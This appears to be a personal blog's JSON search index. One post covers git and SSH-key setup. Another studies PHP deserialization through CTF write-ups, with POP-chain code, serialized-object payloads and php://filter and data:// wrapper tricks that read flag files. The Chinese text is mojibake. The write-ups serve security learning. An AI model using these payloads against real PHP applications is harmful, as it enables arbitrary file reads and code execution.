{"meta":{"title":"Ethe's blog","subtitle":"Etheã®åšå®¢","description":"","author":"Ethe","url":"https://Ethe448.github.io","root":"/"},"pages":[{"title":"404","date":"2022-01-17T03:58:22.000Z","updated":"2022-01-17T03:58:42.774Z","comments":true,"path":"404/index.html","permalink":"https://ethe448.github.io/404/index.html","excerpt":"","text":""},{"title":"about","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:53:25.024Z","comments":true,"path":"about/index.html","permalink":"https://ethe448.github.io/about/index.html","excerpt":"","text":""},{"title":"friends","date":"2022-01-16T13:54:20.000Z","updated":"2022-01-16T13:55:40.821Z","comments":true,"path":"friends/index.html","permalink":"https://ethe448.github.io/friends/index.html","excerpt":"","text":""},{"title":"contact","date":"2022-01-16T13:54:11.000Z","updated":"2022-01-17T07:10:36.704Z","comments":true,"path":"contact/index.html","permalink":"https://ethe448.github.io/contact/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:53:57.523Z","comments":true,"path":"tags/index.html","permalink":"https://ethe448.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:57:26.689Z","comments":true,"path":"categories/index.html","permalink":"https://ethe448.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"githubä½¿ç”¨","slug":"githubä½¿ç”¨","date":"2021-10-02T04:27:09.000Z","updated":"2022-01-17T08:32:32.926Z","comments":true,"path":"2021/10/02/githubä½¿ç”¨/","link":"","permalink":"https://ethe448.github.io/2021/10/02/github%E4%BD%BF%E7%94%A8/","excerpt":"â€‹ åœ¨å­¦pythonçš„æ—¶å€™é¡ºä¾¿å­¦äº†äº›GitHubçš„ä½¿ç”¨ï¼Œå†™ä¸ªæ–‡æ¡£é˜²æ­¢å¿˜äº†","text":"â€‹ åœ¨å­¦pythonçš„æ—¶å€™é¡ºä¾¿å­¦äº†äº›GitHubçš„ä½¿ç”¨ï¼Œå†™ä¸ªæ–‡æ¡£é˜²æ­¢å¿˜äº† ç»‘å®šç”¨æˆ· æ‰“å¼€git-bash å¡«å†™ç”¨æˆ·åå’Œå¯†ç  æç¤ºï¼ˆé…ç½®çš„å¸å·åå’Œé‚®ç®±ä¸€å®šè¦ä¸GitHubç›¸åŒï¼Œä¸ç„¶ä¼šæäº¤å¤±è´¥ï¼‰ git config --global user.name &quot;@@@&quot; (GitHubç›¸å¯¹åº”çš„å¸å·åç§°) git config --global user.email &quot;123@163.com&quot; ï¼ˆGitHbuç›¸å¯¹åº”çš„é‚®ç®±å¸å·ï¼‰ è®¾ç½®ssh key ç”Ÿæˆssh key é¦–å…ˆæ£€æŸ¥æ˜¯å¦å·²ç”Ÿæˆå¯†é’¥ cd ~/.sshï¼Œlså¦‚æœæœ‰3ä¸ªæ–‡ä»¶ï¼Œåˆ™å¯†é’¥å·²ç»ç”Ÿæˆï¼Œid_rsa.pubå°±æ˜¯å…¬é’¥ å¦‚æœæ²¡æœ‰ï¼Œè¾“å…¥: ssh-keygen -t rsa -C &quot;ä½ çš„é‚®ç®±&quot; å¤åˆ¶ssh key æ–¹æ³•1: è¾“å…¥ clip &lt; ~/.ssh/id_rsa.pub ä¼šè‡ªåŠ¨å¤åˆ¶ssh keyï¼Œå¯ä»¥ç›´æ¥ç²˜è´´ æ–¹æ³•2:åœ¨c/Users/Administrator/.ssh/id_rsa)æ–‡ä»¶æ‰¾åˆ°ç›´æ¥å¤åˆ¶ è¿æ¥githubï¼Œæ‰“å¼€GitHub è¿›å…¥settingæ‰¾åˆ°ssh keyå¹¶æ–°å»º ç„¶åæµ‹è¯•è¿æ¥æ˜¯å¦æˆåŠŸ è¾“å…¥: ssh -T &#x67;&#x69;&#116;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#98;&#46;&#99;&#x6f;&#x6d; ä¸Šä¼  ä¸Šä¼ çš„åŸºæœ¬æ­¥éª¤å°±æ˜¯è¿™æ ·äº† å…ˆæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¤¹æŒ‰ç€å›¾ç‰‡é‡Œçš„æ­¥éª¤æ¥ å…ˆåˆå§‹åŒ–å†æŠŠæƒ³ä¼ çš„æ–‡ä»¶ä¼ ä¸Šå» å¯ä»¥ç”¨git add .ä¸Šä¼ æ‰€æœ‰æ–‡ä»¶ æ³¨ï¼š è¾“å…¥git add .åå¦‚æœæŠ¥é”™ warning: LF will be replaced by CRLF in gradlew. The file will have its original line endings in your working directory åˆ™å†è¾“å…¥git config --global core.autocrlf falseåå†é‡æ–°è¾“å…¥git add .å‘½ä»¤å³å¯ git commitæ·»åŠ å¤‡æ³¨ å…‹éš†ä»“åº“ $ git clone ç½‘å€ [è‡ªå®šä¹‰ç›®å½•å] å¯ä»¥ç”¨https://æˆ–git://æˆ–sshä¼ è¾“åè®® æŸ¥çœ‹è¿æ¥çš„ä»“åº“åœ°å€ git remote -v å¦‚æœåœ¨å¦å¤–çš„æ–‡ä»¶å¤¹æäº¤éœ€é‡æ–°è¿›è¡Œä¸€éå›¾ä¸­æ­¥éª¤ è¿˜è¦å†pushå‰è¾“å…¥ git pull --rebase origin main è¯¥å‘½ä»¤çš„æ„æ€æ˜¯æŠŠè¿œç¨‹åº“ä¸­çš„æ›´æ–°åˆå¹¶åˆ°ï¼ˆpull=fetch+mergeï¼‰æœ¬åœ°åº“ä¸­ï¼Œâ€“-rebaseçš„ä½œç”¨æ˜¯å–æ¶ˆæ‰æœ¬åœ°åº“ä¸­åˆšåˆšçš„commitï¼Œå¹¶æŠŠä»–ä»¬æ¥åˆ°æ›´æ–°åçš„ç‰ˆæœ¬åº“ä¹‹ä¸­ã€‚å‡ºç°å¦‚ä¸‹å›¾æ‰§è¡Œpullæ‰§è¡ŒæˆåŠŸåï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œgit push origin mainæ“ä½œã€‚ å¦åˆ™å°±ä¼šå› ä¸ºæœ¬åœ°åº“ä¸è¿œç¨‹åº“ä¸ä¸€è‡´å¯¼è‡´æŠ¥é”™","categories":[],"tags":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://ethe448.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","date":"2021-06-29T16:19:02.000Z","updated":"2022-01-17T08:34:15.098Z","comments":true,"path":"2021/06/30/ååºåˆ—åŒ–/","link":"","permalink":"https://ethe448.github.io/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"åŸºç¡€çŸ¥è¯†phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸»è¦æ˜¯é€šè¿‡serializeå’Œunserializeä¸¤ä¸ªå‡½æ•° serialize()å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œunserialize()å°†å­—ç¬¦ä¸²è¿˜åŸä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹ååºåˆ—åŒ–è¿›è¡Œåˆ©ç”¨ä¹Ÿä¸»è¦æ˜¯é€šè¿‡å…¶ä¸­çš„é­”æœ¯æ–¹æ³•","text":"åŸºç¡€çŸ¥è¯†phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸»è¦æ˜¯é€šè¿‡serializeå’Œunserializeä¸¤ä¸ªå‡½æ•° serialize()å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œunserialize()å°†å­—ç¬¦ä¸²è¿˜åŸä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹ååºåˆ—åŒ–è¿›è¡Œåˆ©ç”¨ä¹Ÿä¸»è¦æ˜¯é€šè¿‡å…¶ä¸­çš„é­”æœ¯æ–¹æ³• å‡ ä¸ªå¸¸è§çš„é­”æœ¯æ–¹æ³• __constructï¼š åœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ã€‚ __destructï¼š å’Œæ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡æ‰€åœ¨å‡½æ•°è°ƒç”¨å®Œæ¯•åæ‰§è¡Œã€‚ __toStringï¼šå½“å¯¹è±¡è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨ã€‚ __sleep:åºåˆ—åŒ–å¯¹è±¡ä¹‹å‰å°±è°ƒç”¨æ­¤æ–¹æ³•(å…¶è¿”å›éœ€è¦ä¸€ä¸ªæ•°ç»„) __wakeup:ååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰è°ƒç”¨è¯¥æ–¹æ³• __call:å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚ __get:åœ¨è°ƒç”¨ç§æœ‰å±æ€§çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œ __isset()åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __invoke() å½“å°è¯•æŠŠå¯¹è±¡å½“æ–¹æ³•è°ƒç”¨æ—¶è°ƒç”¨ã€‚ __unset()åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ æ ¼å¼ O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125; ç±»å‹:é•¿åº¦:&quot;åå­—&quot;:ç±»ä¸­å˜é‡çš„ä¸ªæ•°:&#123;ç±»å‹:é•¿åº¦:&quot;åå­—&quot;;ç±»å‹:é•¿åº¦:&quot;å€¼&quot;;......&#125; åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ privateç±»å‹æœ‰éšè—çš„ç©ºæ ¼ç¬¦ ååºåˆ—åŒ–çš„å¸¸è§èµ·ç‚¹ __wakeup ä¸€å®šä¼šè°ƒç”¨ __destruct ä¸€å®šä¼šè°ƒç”¨ __toString å½“ä¸€ä¸ªå¯¹è±¡è¢«ååºåˆ—åŒ–ååˆè¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨ ååºåˆ—åŒ–çš„å¸¸è§ä¸­é—´è·³æ¿: __toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨__get è¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è¢«è°ƒç”¨__set å½“ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨__isset å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è¢«è°ƒç”¨ã€‚å½¢å¦‚ $this-&gt;$func(); ååºåˆ—åŒ–çš„å¸¸è§ç»ˆç‚¹: __call è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨call_user_func ä¸€èˆ¬phpä»£ç æ‰§è¡Œéƒ½ä¼šé€‰æ‹©è¿™é‡Œcall_user_func_array ä¸€èˆ¬phpä»£ç æ‰§è¡Œéƒ½ä¼šé€‰æ‹©è¿™é‡Œ POPé“¾ç®€ä»‹å€Ÿé‰´çš„æ–‡ç« ï¼š phpååºåˆ—åŒ–åˆ©ç”¨â€”â€”POPé“¾æ„é€ å®ä¾‹ - ç®€ä¹¦ (jianshu.com) (1æ¡æ¶ˆæ¯) PHPååºåˆ—åŒ–â€”æ„é€ POPé“¾_Lemon&#39;s blog-CSDNåšå®¢_phpååºåˆ—åŒ–popé“¾ POP é¢å‘å±æ€§ç¼–ç¨‹(Property-Oriented Programing) å¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾,æœ€ç»ˆè¾¾åˆ°æ”»å‡»è€…é‚ªæ¶çš„ç›®çš„ã€‚ç±»ä¼¼äºPWNä¸­çš„ROPï¼Œæœ‰æ—¶å€™ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œç”±å®ƒè°ƒç”¨çš„__wakeup()ä¸­åˆå»è°ƒç”¨äº†å…¶ä»–çš„å¯¹è±¡ï¼Œç”±æ­¤å¯ä»¥æº¯æºè€Œä¸Šï¼Œåˆ©ç”¨ä¸€æ¬¡æ¬¡çš„â€œgadgetâ€æ‰¾åˆ°æ¼æ´ç‚¹ã€‚ POPé“¾åˆ©ç”¨æŠ€å·§1ã€ä¸€äº›æœ‰ç”¨çš„POPé“¾ä¸­å‡ºç°çš„æ–¹æ³•ï¼š - å‘½ä»¤æ‰§è¡Œï¼šexec()ã€passthru()ã€popen()ã€system() - æ–‡ä»¶æ“ä½œï¼šfile_put_contents()ã€file_get_contents()ã€unlink() 2ã€ååºåˆ—åŒ–ä¸­ä¸ºäº†é¿å…ä¿¡æ¯ä¸¢å¤±ï¼Œä½¿ç”¨å¤§å†™Sæ”¯æŒå­—ç¬¦ä¸²çš„ç¼–ç ã€‚PHP ä¸ºäº†æ›´åŠ æ–¹ä¾¿è¿›è¡Œååºåˆ—åŒ– Payload çš„ ä¼ è¾“ä¸æ˜¾ç¤º(é¿å…ä¸¢å¤±æŸäº›æ§åˆ¶å­—ç¬¦ç­‰ä¿¡æ¯)ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤ºï¼Œä½¿ç”¨å¦‚ä¸‹å½¢å¼å³å¯ç»•è¿‡ï¼Œå³ï¼š s:4:\"user\"; -> S:4:\"use\\72\"; 3ã€æ·±æµ…copyï¼šåœ¨ phpä¸­å¦‚æœæˆ‘ä»¬ä½¿ç”¨ &amp; å¯¹å˜é‡Açš„å€¼æŒ‡å‘å˜é‡Bï¼Œè¿™ä¸ªæ—¶å€™æ˜¯å±äºæµ…æ‹·è´ï¼Œå½“å˜é‡Bæ”¹å˜æ—¶ï¼Œå˜é‡Aä¹Ÿä¼šè·Ÿç€æ”¹å˜ã€‚åœ¨è¢«ååºåˆ—åŒ–çš„å¯¹è±¡çš„æŸäº›å˜é‡è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å…¶ä»–å˜é‡å¯æ§çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥åˆ©ç”¨æµ…æ‹·è´æ¥ç»•è¿‡è¿‡æ»¤ã€‚ 4ã€é…åˆPHPä¼ªåè®®å®ç°æ–‡ä»¶åŒ…å«ã€å‘½ä»¤æ‰§è¡Œç­‰æ¼æ´ã€‚ wpå…ˆè´´ä¿©ä¹‹å‰å†™çš„ç®€å•çš„ [ZJCTF 2019]NiZhuanSiWei çœ‹è§file_get_contents(),åˆ©ç”¨ä¼ªåè®®data://text/plain;base64ç»•è¿‡ å†åˆ©ç”¨php://filterè¯»å–uselesså†…çš„å†…å®¹ è§£ç å å¯çŸ¥flagåœ¨flag.phpä¸­ è¯•å›¾è®©file=flag.php çœ‹åˆ°unserializeå‡½æ•°ï¼Œåˆ©ç”¨phpååºåˆ—åŒ– æ„é€ payload ï¼Ÿtext=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} æŸ¥çœ‹æºç æ‰¾åˆ°flag [æå®¢å¤§æŒ‘æˆ˜ 2019]PHPé¡µé¢ä¸­æç¤ºæœ‰å¤‡ä»½æ–‡ä»¶ï¼Œå¾¡å‰‘æ‰«ä¸€é æ‰¾åˆ°å­˜åœ¨www.zip é‡ç‚¹åœ¨class.phpå’Œindex.phpä¸­ æ‰€ä»¥è¦ä¼ å…¥ä¸€ä¸ªselectå‚æ•°ï¼Œåˆ©ç”¨ååºåˆ—åŒ–è®©username=admin password=100 å› ä¸ºusernameå’Œpasswordä¸¤ä¸ªä¸ºprivateç±»å‹ æ‰€ä»¥æœ‰éšè—çš„ç©ºæ ¼ç¬¦ select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot; [MRCTF2020]Ezpopé¢˜ç›®æºç  class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125; &#125; class Show&#123; public $source; public $str; public function __construct($file&#x3D;&#39;index.php&#39;)&#123; $this-&gt;source &#x3D; $file; echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\\.\\.&#x2F;i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source &#x3D; &quot;index.php&quot;; &#125; &#125; &#125; class Test&#123; public $p; public function __construct()&#123; $this-&gt;p &#x3D; array(); &#125; public function __get($key)&#123; $function &#x3D; $this-&gt;p; return $function(); &#125; &#125; if(isset($_GET[&#39;pop&#39;]))&#123; @unserialize($_GET[&#39;pop&#39;]); &#125; else&#123; $a&#x3D;new Show; highlight_file(__FILE__); &#125; é¢˜ç›®é‡Œå‡ºç°çš„é­”æœ¯å˜é‡ __construct å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œ __toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚ __wakeup() ä½¿ç”¨unserializeæ—¶è§¦å‘ __get() ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® #éš¾ä»¥è®¿é—®åŒ…æ‹¬ï¼šï¼ˆ1ï¼‰ç§æœ‰å±æ€§ï¼Œï¼ˆ2ï¼‰æ²¡æœ‰åˆå§‹åŒ–çš„å±æ€§ __invoke() å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥é¦–å…ˆè¦getè¿›ä¸€ä¸ªpopå€¼ï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥å°±ä¼šè°ƒç”¨__wakeup()è¿™ä¸ªæ–¹æ³•_ __wakeup()ä¸­é‡Œåˆ©ç”¨preg_matchå¯¹ä¼ å…¥çš„å€¼è¿›è¡Œè¿‡æ»¤ï¼Œä½†å¦‚æœthis-&gt;sourceæ˜¯showç±»ï¼Œå°±ä¼šè°ƒç”¨__toString è¿™é‡Œä¼šè¿”å›$this-&gt;str-&gt;sourceï¼Œä½†å¦‚æœæ²¡æœ‰sourceè¿™ä¸ªå±æ€§ï¼Œæ¥ä¸‹æ¥å°±ä¼šè°ƒç”¨__get()ï¼Œç„¶åä¼šå°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°ï¼Œ è¿™é‡Œä¹Ÿå°±ä¼šè§¦å‘__invoke()ï¼Œè¿›è€Œè°ƒç”¨append åœ¨appendçš„ä¸­å­˜åœ¨includeï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»åˆ°flag payload ï¼ˆè‡ªå·±å†™ä¸€ä¸ªè¿˜æ˜¯æœ‰ç‚¹å›°éš¾ &lt;?php class Modifier &#123; protected $var &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;; &#125; class Show &#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source &#x3D; $file; &#125; &#125; class Test &#123; public $p; &#125; $a &#x3D; new Show(&#39;aaa&#39;); $a-&gt;str &#x3D; new Test(); $a-&gt;str-&gt;p &#x3D; new Modifier(); $b &#x3D; new Show($a); echo urlencode(serialize($b)); base64è§£ç æ‹¿åˆ°flag CODE REVIEW ä»£ç å®¡è®¡å¯ä»¥çœ‹å‡ºè¿™é‡Œé¦–å…ˆè¦å…ˆgetè¿›pleaseget=1ç„¶åpostè¿›pleasepostï¼Œmd51ï¼Œmd52å’Œobjå››ä¸ªå€¼ï¼Œè€Œobjè¿™é‡Œå­˜åœ¨ååºåˆ—åŒ–çš„æ¼æ´ ä¸”å½“if($this-&gt;correct === $this-&gt;input)æˆç«‹æ—¶å°±ä¼šæ‰“å°å‡ºflag è¿™é‡ŒåŒæ—¶è¦æ±‚ä¼ å…¥çš„md51å’Œmd52çš„md5å€¼ç›¸ç­‰ï¼Œä¸”è‡ªèº«ä¸ç›¸ç­‰ï¼Œç”±äºmd5ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œæ‰€ä»¥ä¼ å…¥æ•°ç»„çš„è¿”å›å€¼éƒ½ä¸ºnull è€Œå› ä¸º$this-&gt;correctè¿™é‡Œè¿›è¡Œäº†ç¼–ç ï¼Œæ‰€ä»¥è¦ä½¿ifè¯­å¥æˆç«‹åœ¨æ„é€ payloadæ—¶å¯ä»¥é‡‡ç”¨å¼•ç”¨èµ‹å€¼çš„æ–¹æ³• æ„é€ payload //uniqid() :å‡½æ•°åŸºäºä»¥å¾®ç§’è®¡çš„å½“å‰æ—¶é—´ï¼Œç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ IDã€‚ //ä¼ å€¼èµ‹å€¼ï¼šå˜é‡é»˜è®¤æ€»æ˜¯ä¼ å€¼èµ‹å€¼ã€‚é‚£ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å°†ä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼èµ‹äºˆä¸€ä¸ªå˜é‡æ—¶ï¼Œæ•´ä¸ªåŸå§‹è¡¨è¾¾å¼çš„å€¼è¢«èµ‹å€¼åˆ°ç›®æ ‡å˜é‡ã€‚è¿™æ„å‘³ç€ï¼Œä¾‹å¦‚ï¼Œå½“ä¸€ä¸ªå˜é‡çš„å€¼èµ‹äºˆå¦å¤–ä¸€ä¸ªå˜é‡æ—¶ï¼Œæ”¹å˜å…¶ä¸­ä¸€ä¸ªå˜é‡çš„å€¼ï¼Œå°†ä¸ä¼šå½±å“åˆ°å¦å¤–ä¸€ä¸ªå˜é‡ã€‚ //å¼•ç”¨èµ‹å€¼ï¼šPHP ä¹Ÿæä¾›äº†å¦å¤–ä¸€ç§æ–¹å¼ç»™å˜é‡èµ‹å€¼ï¼šå¼•ç”¨èµ‹å€¼ã€‚è¿™æ„å‘³ç€æ–°çš„å˜é‡ç®€å•çš„å¼•ç”¨ï¼ˆæ¢è¨€ä¹‹ï¼Œâ€œæˆä¸ºå…¶åˆ«åâ€ æˆ–è€… â€œæŒ‡å‘â€ï¼‰äº†åŸå§‹å˜é‡ã€‚æ”¹åŠ¨æ–°çš„å˜é‡å°†å½±å“åˆ°åŸå§‹å˜é‡ï¼Œåä¹‹äº¦ç„¶ã€‚ æ‰€ä»¥æœ€ç»ˆpayloadä¸º getå†…å®¹ä¸ºï¼š?pleaseget=1 postå†…å®¹ä¸ºï¼špleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;} æ‹¿åˆ°flag [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialzæºç  &lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op &#x3D; &quot;1&quot;; $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;; $content &#x3D; &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123; $res &#x3D; $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res &#x3D; &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res &#x3D; file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;) $this-&gt;op &#x3D; &quot;1&quot;; $this-&gt;content &#x3D; &quot;&quot;; $this-&gt;process(); &#125; &#125; function is_valid($s) &#123; for($i &#x3D; 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125)) return false; return true; &#125; if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123; $str &#x3D; (string)$_GET[&#39;str&#39;]; if(is_valid($str)) &#123; $obj &#x3D; unserialize($str); &#125; &#125; çœ‹åˆ°unserializeå¯ä»¥å¾ˆå®¹æ˜“æƒ³åˆ°ååºåˆ—åŒ–ï¼Œæºç é‡Œè¿˜æœ‰file_get_contentsï¼Œæ‰€ä»¥çŒœæµ‹è¿™é¢˜æ˜¯åˆ©ç”¨ååºåˆ—åŒ–é€šè¿‡æ–‡ä»¶åŒ…å«è¯»å–flagï¼Œåˆ©ç”¨php://filteræ¥é€ æˆä»»æ„æ–‡ä»¶è¯»å– åœ¨ä¼ å…¥åè¿˜å­˜åœ¨ä¸€ä¸ªis__valid()å‡½æ•°çš„è¿‡æ»¤ï¼Œè¦æ±‚ä¼ å…¥å†…å®¹çš„asciiç åœ¨32åˆ°123ä¹‹å†… ä¹‹åè¿›è¡Œååºåˆ—åŒ–ï¼Œç”±äºè¦åˆ©ç”¨file_get_contents()è¯»å–flagï¼Œå¹¶å°†å…¶æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥éœ€è¦è®©op=2ï¼Œæ‰§è¡Œread()ä¸­çš„å†…å®¹ æ„é€ payload è¿™é‡Œå› ä¸ºprotectè¿›è¡Œååºåˆ—åŒ–æ—¶ä¼šå‡ºç°ç‰¹æ®Šç¬¦å·ï¼Œå¯¼è‡´æ— æ³•é€šè¿‡is__validå‡½æ•°çš„è¿‡æ»¤ï¼Œå¯ä»¥åˆ©ç”¨å¯¹äºPHPç‰ˆæœ¬7.1+ï¼Œå¯¹å±æ€§çš„ç±»å‹ä¸æ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥å°†protectedç±»å‹æ”¹ä¸ºpublicï¼Œä»¥æ¶ˆé™¤ä¸å¯æ‰“å°å­—ç¬¦ã€‚ ?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; ï¼ˆåˆšå¼€å§‹ç»™opèµ‹äº†ä¸ªå­—ç¬¦å‹çš„â€œ2â€ï¼Œæ‰¾é”™æ‰¾äº†åŠå¤©ã€‚ã€‚ã€‚ æ‹¿åˆ°flag æ¥ä¸‹æ¥base64è§£ç å°±å¯ä»¥æ‹¿åˆ°flagäº† è¿™å‘¨åˆ’æ°´äº†ï¼ˆ å¿™ç€å­¦ç§‘ç›®ä¸‰äº†ï¼Œå‘¨ä¸‰è€ƒå®Œè¯•å†è¡¥ç‚¹ï¼ˆ","categories":[],"tags":[{"name":"webå­¦ä¹ ","slug":"webå­¦ä¹ 